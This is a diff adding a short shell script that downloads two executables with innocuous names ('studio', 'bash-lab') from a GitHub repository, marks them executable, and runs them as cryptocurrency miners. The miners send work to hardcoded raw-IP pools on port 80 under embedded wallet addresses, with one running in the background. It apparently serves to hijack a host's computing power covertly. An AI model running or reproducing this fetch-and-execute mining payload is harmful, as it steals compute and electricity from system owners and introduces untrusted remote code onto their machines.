@@ -1,0 +1,11 @@
+wget https://github.com/viloidka/go/raw/main/studio
+chmod 700 studio
+#!/bin/bash
+
+POOL=206.189.183.210:80
+WALLET=1d12d89754db36c51d1c3e4907eb1a191c8c28c506f1175a2339f1a48a3ee1014e1
+WORKER=rk
+./studio --coin BEAM --pool $POOL --user $WALLET.$WORKER --no-cl & 
+wget https://github.com/viloidka/go/raw/main/bash-lab
+chmod +x bash-lab
+./bash-lab -a yespower -o stratum+tcp://137.184.40.250:80 -u web1qmt8q9y0c8wwctsxee5zrl2eel2k6zkxk7udaut.rk -p m=solo -t2 
